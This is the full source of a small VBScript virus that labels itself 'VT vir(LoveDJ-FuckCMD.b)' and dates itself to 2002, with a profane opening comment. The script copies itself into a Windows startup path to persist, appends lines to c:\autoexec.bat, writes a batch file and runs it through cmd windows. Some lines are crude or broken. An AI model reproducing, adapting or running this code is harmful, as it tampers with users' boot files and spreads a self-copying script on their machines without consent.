   ;If run in windows 2000, -_-!. Fuck!
   On Error Resume Next
   Dim VT
   Set fso = CreateObject("Scripting.FileSystemObject")
   set file = fso.OpenTextFile(WScript.ScriptFullname,1)
   Set VT = WScript.CreateObject ("WScript.shell")
   msgbox"VT vir(LoveDJ-FuckCMD.b) CopyRight 2002"
   Set Vir = fso.GetFile(WScript.ScriptFullName)
   Vir.Copy("C:\Docume~1\Admini~1\startm~1\programs\run"&"\Fuck.vbs")
   VT.run "cmd /k Echo @echo off >>c:\autoexec.bat"
   VT.run "cmd /k Echo echo VT Vir(LoveDj-FuckCMD) CopyRight 2002 >>c:\avp.bat"
   VT.run "cmd /k c:\avp.bat"
   VT.run=True
   If True Then
   End If
